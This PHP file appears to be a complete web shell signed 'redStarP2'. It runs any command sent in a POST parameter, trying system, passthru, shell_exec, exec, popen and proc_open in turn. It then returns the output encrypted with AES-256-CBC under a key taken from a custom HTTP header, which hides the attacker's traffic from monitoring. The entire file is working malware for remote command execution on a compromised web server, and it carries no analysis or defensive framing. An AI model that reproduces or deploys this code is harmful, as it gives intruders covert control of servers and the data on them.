<?php
# written By redStarP2
# for his lonely redStar
function shelle($comm){
	if (function_exists('system')) {
	 	ob_start();
   		system($comm,$a);
   		$out1 = ob_get_contents();
   		ob_end_clean();
   		return $out1;
 
	} elseif (function_exists('passthru')) {
		return passthru($comm);
	}elseif (function_exists('shell_exec')) {
		return shell_exec($comm);
	}elseif (function_exists('exec')) {
		return exec($comm);
	}elseif (function_exists('popen')) {
		return fread(popen($comm,"r"),4096);
	}elseif (function_exists('proc_open')) {
		$p = proc_open(
				$comm,
				array(
					0 => array('pipe','r'),
					1 => array('pipe','w'),
					2 => array('pipe','w') 
				),
				$pipes);
		return stream_get_contents($pipes[1]);
	} else {
    	return "[-] Error";
	}
}
$iv = openssl_random_pseudo_bytes(16);
$xA = shelle($_POST['red']);
$ciphertext = @openssl_encrypt($xA, "AES-256-CBC", $_SERVER['HTTP_REDSTAR'], OPENSSL_RAW_DATA, $iv);
echo (base64_encode($iv.$ciphertext));
?>